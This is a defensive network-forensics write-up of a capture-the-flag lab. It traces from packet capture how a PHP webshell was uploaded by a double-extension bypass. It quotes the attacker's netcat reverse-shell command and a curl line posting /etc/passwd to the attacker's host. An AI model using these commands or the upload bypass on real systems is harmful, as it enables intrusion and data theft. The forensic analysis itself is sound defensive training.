---
layout: lab
title: "WebStrike — PHP Webshell via Double Extension Bypass"
platform: CyberDefenders
difficulty: Easy
category: Network Forensics
tools: [Wireshark, IP2Location]
tactics: [Initial Access, Execution, Persistence, Command And Control, Exfiltration]
proof: https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/webstrike/
challenge_url: https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/
permalink: /blue-team/labs/webstrike/
---
## Overview

A suspicious file was identified on a company web server, raising concerns of potential compromise. The network team captured traffic and provided a PCAP file (355 packets) for analysis.

**Objective:**
- Determine how the file was uploaded
- Identify attacker activity
- Assess potential data exfiltration

---

## Initial Traffic Analysis

Opened the PCAP in Wireshark. Statistics → Endpoints revealed two communicating IP addresses:

- `117.11.88.124` (External)
- `24.46.63.79` (Web Server)

The limited packet count (355 packets) suggested a focused intrusion rather than large-scale scanning.

![](Pasted%20image%2020260223193950.png)

---

## Geolocation

`117.11.88.124` resolved to:

- **City:** Tianjin
- **Country:** China
- **ISP:** China Unicom Tianjin Province Network

This indicates the attack originated externally.

![](Pasted%20image%2020260223194937.png)

![](Pasted%20image%2020260223195031.png)

---

## HTTP Traffic Analysis

Filtering for HTTP traffic:

```
http
```

Following HTTP streams revealed the attacker's User-Agent:

```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

While this appears legitimate, User-Agent strings can be spoofed. This value could be used in detection rules for threat hunting.

![](Pasted%20image%2020260223195057.png)

![](Pasted%20image%2020260223195430.png)

---

## Malicious File Upload

Filtering for POST requests:

```
http.request.method == "POST"
```

Identified a suspicious file upload:

```
filename="image.jpg.php"
```

This suggests a file upload validation weakness, allowing a **double-extension bypass** (`image.jpg.php`), resulting in remote code execution capability.

![](Pasted%20image%2020260223195448.png)

Upload path:

```
/reviews/uploads/
```

This confirms the web application allowed executable file uploads.

![](Pasted%20image%2020260223195931.png)

![](Pasted%20image%2020260223195955.png)

---

## Reverse Shell Activity

Inspection of the uploaded file revealed a webshell containing:

```
nc 117.11.88.124 8080
```

The attacker attempted to establish outbound communication to `117.11.88.124:8080`. This indicates the server permitted unrestricted outbound traffic, enabling reverse shell callback. This is consistent with reverse shell behaviour.

![](Pasted%20image%2020260223200120.png)

![](Pasted%20image%2020260223200522.png)

![](Pasted%20image%2020260223200853.png)

![](Pasted%20image%2020260223201034.png)

---

## Data Exfiltration Attempt

Further HTTP stream analysis revealed:

```
curl -X POST -d /etc/passwd http://117.11.88.124:443
```

The attacker attempted to exfiltrate `/etc/passwd`. This confirms post-exploitation activity and attempted credential harvesting.

![](Pasted%20image%2020260223201208.png)

![](Pasted%20image%2020260223201224.png)

---

## Attack Chain Summary

1. External attacker connects to web server
2. Malicious PHP webshell uploaded using double-extension bypass (`image.jpg.php`)
3. Reverse shell attempted via netcat (port 8080)
4. Attacker executes commands on compromised host
5. Attempted exfiltration of `/etc/passwd` via HTTP POST

![](Pasted%20image%2020260223201633.png)

---

## Useful Wireshark Filters

| Purpose | Filter |
|---|---|
| Isolate HTTP traffic | `http` |
| File upload activity | `http.request.method == "POST"` |
| Isolate attacker IP | `ip.addr == 117.11.88.124` |
| Reverse shell traffic | `tcp.port == 8080` |
| Isolate TCP stream | `tcp.stream eq X` |

**Follow specific TCP stream:** Right-click packet → Follow → HTTP Stream

---

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Exploit Public-Facing Application | T1190 |
| Web Shell | T1505.003 |
| Command Execution | T1059 |
| Exfiltration Over C2 Channel | T1041 |
| Application Layer Protocol | T1071 |

---

## Detection & Mitigation Recommendations

- Enforce strict file upload validation
- Block double extensions (`.jpg.php`, `.png.php` etc.)
- Restrict outbound traffic from web servers
- Monitor abnormal POST uploads to `/uploads/` directories
- Detect netcat usage patterns in process logs
- Enable WAF with file-type filtering

---

## Lessons Learned

- Small PCAP files can still contain complete attack chains
- File upload functionality must strictly validate both extensions and MIME types
- Outbound traffic restrictions are critical to prevent reverse shell communication
- Even basic HTTP analysis can uncover full post-exploitation behaviour
